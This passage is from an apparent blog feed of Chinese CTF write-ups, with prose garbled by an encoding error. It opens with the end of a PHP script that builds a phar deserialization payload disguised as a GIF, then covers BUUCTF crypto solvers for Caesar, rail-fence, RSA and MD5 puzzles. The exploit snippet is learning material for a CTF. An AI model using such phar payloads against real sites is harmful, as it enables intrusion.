class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;aaa.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸º phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> dbCtrl;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf cryptoéƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>å­¦å­¦å¯†ç å­¦å§ï¼èœçš„é¡¶ä¸ä½äº†ğŸ˜­</p><a id="more"></a><h3 id="å˜å¼‚å‡¯æ’’"><a href="#å˜å¼‚å‡¯æ’’" class="headerlink" title="å˜å¼‚å‡¯æ’’"></a>å˜å¼‚å‡¯æ’’</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŠ å¯†å¯†æ–‡ï¼šafZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">æ ¼å¼ï¼šflag&#123; &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å·¥å…·è§£å‘ç°æ²¡æœ‰åˆé€‚çš„ï¼Œçœ‹ä¸‹å‡¯æ’’å¯†ç çš„åŸç†å§ï¼š</p><blockquote><p>å‡¯æ’’åŠ å¯†æ³•ï¼Œæˆ–ç§°æºæ’’åŠ å¯†ã€æºæ’’å˜æ¢ã€å˜æ¢åŠ å¯†ï¼Œæ˜¯ä¸€ç§æœ€ç®€å•ä¸”æœ€å¹¿ä¸ºäººçŸ¥çš„åŠ å¯†æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§æ›¿æ¢åŠ å¯†çš„æŠ€æœ¯ï¼Œæ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚</p></blockquote><p>æ‰€ä»¥ï¼Œå†™ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;afZ_&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s):</span><br><span class="line">    print(ord(i)-ord(j))</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line"><span class="comment"># 8</span></span><br></pre></td></tr></table></figure><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªè§£å¯†flagçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-26</span>,<span class="number">26</span>):</span><br><span class="line">    k=i</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        flag+=chr(ord(j)+k)</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h3 id="ç¯±ç¬†å¢™çš„å½±å­"><a href="#ç¯±ç¬†å¢™çš„å½±å­" class="headerlink" title="ç¯±ç¬†å¢™çš„å½±å­"></a>ç¯±ç¬†å¢™çš„å½±å­</h3><p>æ …æ å¯†ç ï¼Œè§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,len(plain)<span class="number">-1</span>):</span><br><span class="line">        ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(int(plain.__len__() / n + <span class="number">0.5</span>)):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans += plain[j * n + i]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(n,ans)</span><br><span class="line"> </span><br><span class="line">s=<span class="string">&#x27;felhaagv&#123;ewtehtehfilnakgw&#125;&#x27;</span></span><br><span class="line">decrypto(s)</span><br></pre></td></tr></table></figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p&#x3D;473398607161ï¼Œq&#x3D;4511491ï¼Œe&#x3D;17</span><br><span class="line">æ±‚è§£å‡ºdä½œä¸ºflgaæäº¤</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h3 id="ä¸¢å¤±çš„MD5"><a href="#ä¸¢å¤±çš„MD5" class="headerlink" title="ä¸¢å¤±çš„MD5"></a>ä¸¢å¤±çš„MD5</h3><p>ä»¥ä¸ºå’Œdesæœ‰å…³ğŸ™ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            flag=<span class="string">&#x27;TASC&#x27;</span>+chr(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+chr(j)+<span class="string">&#x27;WDJKX&#x27;</span>+chr(k)+<span class="string">&#x27;ZM&#x27;</span></span><br><span class="line">            m.update(flag.encode())</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                print(des)</span><br></pre></td></tr></table></figure><h3 id="Aliceä¸Bob"><a href="#Aliceä¸Bob" class="headerlink" title="Aliceä¸Bob"></a>Aliceä¸Bob</h3><p>ç›´æ¥ç”¨ç½‘ç«™åˆ†è§£ï¼š<a href="http://www.factordb.com/">http://www.factordb.com</a></p><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101999 Â· 966233</span><br></pre></td></tr></table></figure><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e &#x3D;  65537</span><br><span class="line">c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,p*q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h3 id="å¤§å¸çš„å¯†ç æ­¦å™¨"><a href="#å¤§å¸çš„å¯†ç æ­¦å™¨" class="headerlink" title="å¤§å¸çš„å¯†ç æ­¦å™¨"></a>å¤§å¸çš„å¯†ç æ­¦å™¨</h3><p>å¤§å¸å°±åº”è¯¥æƒ³åˆ°å‡¯æ’’å¤§å¸ï¼š</p><p>å½“i=13æ—¶ å‘ç°è¾“å‡º<code>security</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;FRPHEVGL&#x27;</span></span><br><span class="line">str2 = str1.lower()                                 <span class="comment">#è½¬æ¢ä¸ºå°å†™æ–¹ä¾¿è¯†åˆ«</span></span><br><span class="line">num = <span class="number">1</span>                                             <span class="comment">#åç§»é‡</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    print(<span class="string">&quot;&#123;:&lt;2d&#125;&quot;</span>.format(num),end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> str2:</span><br><span class="line">        <span class="keyword">if</span>(ord(temp)+num &gt; ord(<span class="string">&#x27;z&#x27;</span>)):               <span class="comment">#å¦‚æœè¶…å‡º&#x27;z&#x27;,éœ€è¦é‡æ–°æ˜ å°„ä¼ša~zè¿™26ä¸ªå­—æ¯ä¸Š</span></span><br><span class="line">            print(chr(ord(temp)+num<span class="number">-26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(chr(ord(temp)+num),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&#x27;ComeChina&#x27;</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span>(ord(temp)+<span class="number">13</span> &gt; ord(<span class="string">&#x27;z&#x27;</span>)):               </span><br><span class="line">        print(chr(ord(temp)+<span class="number">13</span><span class="number">-26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(chr(ord(temp)+<span class="number">13</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># PbzrPuvan</span></span><br></pre></td></tr></table></figure><h3 id="ä¼ ç»ŸçŸ¥è¯†-å¤å…¸å¯†ç "><a href="#ä¼ ç»ŸçŸ¥è¯†-å¤å…¸å¯†ç " class="headerlink" title="ä¼ ç»ŸçŸ¥è¯†+å¤å…¸å¯†ç "></a>ä¼ ç»ŸçŸ¥è¯†+å¤å…¸å¯†ç </h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å°æ˜æŸä¸€å¤©æ”¶åˆ°ä¸€å°å¯†ä¿¡ï¼Œä¿¡ä¸­å†™äº†å‡ ä¸ªä¸åŒçš„å¹´ä»½</span><br><span class="line">          è¾›å¯ï¼Œç™¸å·³ï¼Œä¸™æˆŒï¼Œè¾›æœªï¼Œåºšè¾°ï¼Œç™¸é…‰ï¼Œå·±å¯ï¼Œç™¸å·³ã€‚</span><br><span class="line">          ä¿¡çš„èƒŒé¢è¿˜å†™æœ‰â€œ+ç”²å­â€ï¼Œè¯·è§£å‡ºè¿™æ®µå¯†æ–‡ã€‚</span><br><span class="line"></span><br><span class="line">keyå€¼ï¼šCTF&#123;XXX&#125;</span><br></pre></td></tr></table></figure><p>å…­åç”²å­é¡ºåºè¡¨</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/a2cc7cd98d1001e9e5a6b6d7b00e7bec55e79754.jpg"></p><p>å¯¹åº”çš„å¯†æ–‡æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28 30 23 8 17 10 16 30</span><br></pre></td></tr></table></figure><p>åé¢æç¤º<code>+ç”²å­</code>ï¼ŒåŠ ä¸Š60å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88 90 83 68 77 70 76 90</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;88 90 83 68 77 70 76 90&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    print(chr(int(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># XZSDMFLZ</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ …æ å¯†ç è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,len(plain)<span class="number">-1</span>):</span><br><span class="line">        ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(int(plain.__len__() / n + <span class="number">0.5</span>)):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans += plain[j * n + i]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(n,ans)</span><br><span class="line"> </span><br><span class="line">s=<span class="string">&#x27;XZSDMFLZ&#x27;</span></span><br><span class="line">decrypto(s)</span><br><span class="line"><span class="comment"># 2 XSMLZDFZ</span></span><br><span class="line"><span class="comment"># 3 XDLZMZSF</span></span><br><span class="line"><span class="comment"># 4 XMZFSLDZ</span></span><br><span class="line"><span class="comment"># 5 XFZLSZDM</span></span><br><span class="line"><span class="comment"># 6 XZSDMF</span></span><br></pre></td></tr></table></figure><p>å¯¹ç¬¬å››æ å‡¯æ’’å¯†ç è§£å¯†å¾—åˆ°ç±»ä¼¼æ˜æ–‡ï¼Œæäº¤å³ä¸ºflagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHUANGYU</span><br></pre></td></tr></table></figure><h3 id="ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼"><a href="#ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼" class="headerlink" title="ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼"></a>ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">606046152623600817831216121621196386</span><br></pre></td></tr></table></figure><p>ä¸­æ–‡ç”µæŠ¥ç ï¼š<a href="http://code.mcdvisa.com/">http://code.mcdvisa.com</a></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¡ç®—æœºè¦ä»å¨ƒå¨ƒæŠ“èµ·</span><br></pre></td></tr></table></figure><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>æ³„éœ²dpå’Œdqï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_ascii</span>(<span class="params">h</span>):</span></span><br><span class="line">    h = h.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    list_s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(h), <span class="number">2</span>):</span><br><span class="line">        list_s.append(chr(int(h[i:i+<span class="number">2</span>], <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    list_h = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        list_h.append(str(hex(ord(c))[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list_h)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp,dq,p,q,c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = pow(c, dp, p)</span><br><span class="line">    mq = pow(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    print(hex_to_ascii(str(hex(m))))</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure><h3 id="å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ"><a href="#å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ" class="headerlink" title="å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ!"></a>å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ!</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br></pre></td></tr></table></figure><p>quipqiupè§£å¯†ï¼š<a href="https://quipqiup.com/">https://quipqiup.com</a></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200922214944.png"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;</span><br></pre></td></tr></table></figure><h3 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h3><p>åŒæ ·æ˜¯quipqiupè§£å¯†ï¼š<a href="https://quipqiup.com/">https://quipqiup.com</a></p><h3 id="èŒèŒå“’çš„å…«æˆ’"><a href="#èŒèŒå“’çš„å…«æˆ’" class="headerlink" title="èŒèŒå“’çš„å…«æˆ’"></a>èŒèŒå“’çš„å…«æˆ’</h3><p>çŒªåœˆå¯†ç åŠå…¶å˜ç§ï¼š</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/eba2d7ca7bcb0a46d9ed92316d63f6246a60afb8.jpg"></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/9c9a0a46f21fbe094691da1c6d600c338644adb8.jpg"></p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/8c310c338744ebf829be7d37dff9d72a6159a7b8.jpg"></p><h3 id="æƒé™è·å¾—ç¬¬ä¸€æ­¥"><a href="#æƒé™è·å¾—ç¬¬ä¸€æ­¥" class="headerlink" title="æƒé™è·å¾—ç¬¬ä¸€æ­¥"></a>æƒé™è·å¾—ç¬¬ä¸€æ­¥</h3><p>ntmlå“ˆå¸Œç›´æ¥è§£</p><h3 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1&#x3D;22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n&#x3D;22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1&#x3D;11187289</span><br><span 